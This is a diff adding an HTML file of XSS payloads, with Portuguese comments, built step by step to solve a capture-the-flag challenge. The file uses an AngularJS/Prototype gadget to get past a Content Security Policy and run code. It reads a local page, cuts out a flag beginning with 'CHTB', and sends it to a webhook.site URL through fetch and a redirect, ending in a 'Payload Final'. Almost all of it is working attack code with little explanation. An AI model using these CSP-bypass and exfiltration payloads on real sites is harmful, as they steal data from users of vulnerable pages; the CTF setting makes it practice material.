@@ -1,0 +1,89 @@
+<!-- Teste inicial -->
+<script>
+  alert('Hello!');
+</script>
+
+<!-- <script>
+    console.log('Started!!');
+    fetch('http://127.0.0.1:1337/alien')
+    .then(response => response.text())
+    .then(result => fetch('https://webhook.site/f3c42297-7637-493c-ac42-0843e9d26b10?H='+result.length));
+</script> -->
+
+
+<!-- https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d -->
+
+<!-- Alert -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("alert('Fala Hacker!');") }}
+</div>
+
+<!-- Apenas demonstrando o fetch -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<script>
+  fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => document.getElementById('oi').innerText = text.substr(1, 200));
+</script>
+
+<!-- Aplicando o fetch acima na solução -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => document.getElementById('oi').innerText = text.substr(1, 200));") }}
+</div>
+
+<!-- Recortando a flag -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<script>
+  fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); document.getElementById('oi').innerText = text.substr(pos, 50);});
+</script>
+
+<!-- Aplicando o recorte acima na solução -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); document.getElementById('oi').innerText = text.substr(pos, 50);});"); }}
+</div>
+
+<!-- Enviando o recorte -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<script>
+  fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); fetch('https://webhook.site/96d7bea8-254f-4b71-a074-e13e44bca359?flag=' + flag); });
+</script>
+
+<!-- Aplicando o envio acima na solução -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<span id='oi'></span>
+<div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('http://127.0.0.1:1337/alien').then((response) => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); fetch('https://webhook.site/96d7bea8-254f-4b71-a074-e13e44bca359?flag=' + flag); });"); }}
+</div>
+
+<!-- Montando o redirect -->
+<script>
+  fetch('http://127.0.0.1:1337/alien').then(response => response.text()).then((text) => {
+    pos = text.indexOf('CHTB');
+    flag = encodeURI(text.substr(pos, 50));
+    window.location.href = 'https://webhook.site/96d7bea8-254f-4b71-a074-e13e44bca359?flag='+flag;
+  });
+</script>
+
+<script>
+  fetch('http://127.0.0.1:1337/alien').then(response => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); window.location.href = 'https://webhook.site/96d7bea8-254f-4b71-a074-e13e44bca359?flag='+flag; });
+</script>
+
+<!-- Payload Final -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<div ng-app ng-csp>
+  {{ x = $on.curry.call().eval("fetch('http://127.0.0.1:1337/alien').then(response => response.text()).then((text) => { pos = text.indexOf('CHTB'); flag = encodeURI(text.substr(pos, 50)); window.location.href = 'https://webhook.site/96d7bea8-254f-4b71-a074-e13e44bca359?flag='+flag; });") }}
+</div>
